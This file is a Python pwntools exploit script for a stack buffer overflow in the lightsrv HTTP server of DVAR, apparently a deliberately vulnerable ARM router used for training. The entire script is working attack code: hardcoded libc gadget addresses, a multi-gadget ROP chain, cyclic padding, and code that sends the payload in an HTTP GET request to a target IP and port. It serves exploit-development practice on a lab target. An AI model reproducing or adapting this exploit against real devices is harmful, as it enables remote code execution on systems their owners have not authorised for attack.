# DVAR exploit
# Vulnerability: Buffer Overflow in lightsrv HTTP server
# Expected result: print "/bin/sh" on DVAR remote shell
#
# Cf. exploit_research-write_test for the whole rop chain analysis/building

import pwn

#___________________________________________________________________________________________________
#                                   C R A F T I N G   P A Y L O A D
#___________________________________________________________________________________________________                                    

# ASLR disabled, therefore addresses below are always valid
libc_base     = 0x40000000
libgcc_s_base = 0x40077000
binsh_str     = 0x61797 + libc_base         # address of string "/bin/sh"
gadget0       = 0x2139c + libc_base
gadget1       = 0x4110  + libgcc_s_base
gadget2       = 0x2e390 + libc_base
gadget4       = 0x43e8c + libc_base
gadget6       = 0x41d04 + libc_base
gadget8       = 0x7d3c  + libgcc_s_base
gadget10      = 0x49e0  + libgcc_s_base
gadget19      = 0x1fcac + libc_base


http_verb = b"GET /"
http_req_ending = b" \r\n\r\n"

# needs 2058 bytes to overwrite saved lr register on stack (empirically determined)
# Minux 6x4-byte words = 24 bytes for last lightsrv's handle_req() pop instruction
padding = pwn.cyclic(2034)

# pre-rop values on stack popped by last corrupt lightsrv code instructions
# (values on stack code will pop into indicated registers)
ropchain  = pwn.pack(0xffffffff)    # r4
ropchain += pwn.pack(0xdeadbeef)    # r5
ropchain += pwn.pack(0xffffffff)    # r6
ropchain += pwn.pack(0xdeadbeef)    # r7
ropchain += pwn.pack(0xdeadbeef)    # r8
ropchain += pwn.pack(gadget0)       # lr = &Gadget0
# gadget0
ropchain += pwn.pack(gadget1)       # pc = &Gadget1
# gadget1
ropchain += pwn.pack(0xffffffff)    # r0
ropchain += pwn.pack(binsh_str)     # r1
ropchain += pwn.pack(0xffffffff)    # r2
ropchain += pwn.pack(gadget0)       # r3 = &gadget0 (const)
ropchain += pwn.pack(gadget2)       # pc = &gadget2
# gadget2 : doesn't deal with the stack
# gadget3(0bis)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget4)
# gadget4 : no stack value poped off
# gadget5(0bis)
ropchain += pwn.pack(gadget6)
# gadget6: doesn't touch the stack
# gadget7(0bis)
ropchain += pwn.pack(gadget8)
# gagdet8 : doesn't tamper with stack
# gadget9(0bis)
ropchain += pwn.pack(gadget10)
# gadget10
ropchain += pwn.pack(gadget0)
ropchain += pwn.pack(0xffffffff)
ropchain += pwn.pack(0xdeadbeef)
ropchain += pwn.pack(0xdeadbeef)
ropchain += pwn.pack(0xdeadbeef)
ropchain += pwn.pack(gadget2)
# gadget11(2bis) : doesn't change stack
# gadget12(0bis)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget4)
# gadget13(4bis) : nothing to do with stack
# gadget14(0bis)
ropchain += pwn.pack(gadget6)
# gadget15(6bis) : doesn't pop up stuff from stack
# gadget16(0bis)
ropchain += pwn.pack(gadget2)
# gadget17(2bis) : doesn't touch the stack
# gadget18(0bis)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget2)
ropchain += pwn.pack(gadget19)
# gadget19 : pop instruction not relevant, unless process continuation is implemented

payload = padding + ropchain

http_req = http_verb + payload + http_req_ending

#___________________________________________________________________________________________________
#                                   S E N D I N G   P A Y L O A D
#___________________________________________________________________________________________________                                    

target_ip          = "192.168.100.2"
target_port        = 8080

iotarget = pwn.remote(target_ip, target_port)
iotarget.send(http_req)

delims = ("</html>")
response = iotarget.recvuntil(delims)

iotarget.close()
print(response)



